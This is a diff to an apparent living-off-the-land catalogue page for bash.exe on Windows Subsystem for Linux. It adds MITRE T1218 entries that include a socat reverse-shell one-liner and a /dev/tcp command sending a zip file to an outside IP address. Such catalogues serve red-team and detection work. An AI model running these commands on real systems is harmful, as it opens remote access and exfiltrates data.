@@ -44,6 +44,14 @@
 <p>File used by Windows subsystem for Linux</p>
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -68,6 +76,9 @@
 	
 	Alex Ionescu - <a href="https://twitter.com/@aionescu">@aionescu</a>
 	<br>
+	
+	Asif Matadar - <a href="https://twitter.com/@d1r4c">@d1r4c</a>
+	<br>
 	 
 </p>
 <br>
@@ -89,6 +100,36 @@
 		Executes calc.exe from bash.exe
 		<br>
 		<pre><code>bash.exe -c calc.exe</code></pre>
+		Usecase:Performs execution of specified file, can be used as a defensive evasion.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes a reverseshell
+		<br>
+		<pre><code>bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"</code></pre>
+		Usecase:Performs execution of specified file, can be used as a defensive evasion.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Exfiltrate data
+		<br>
+		<pre><code>bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'</code></pre>
 		Usecase:Performs execution of specified file, can be used as a defensive evasion.
 		<br>
 		Privileges required:User
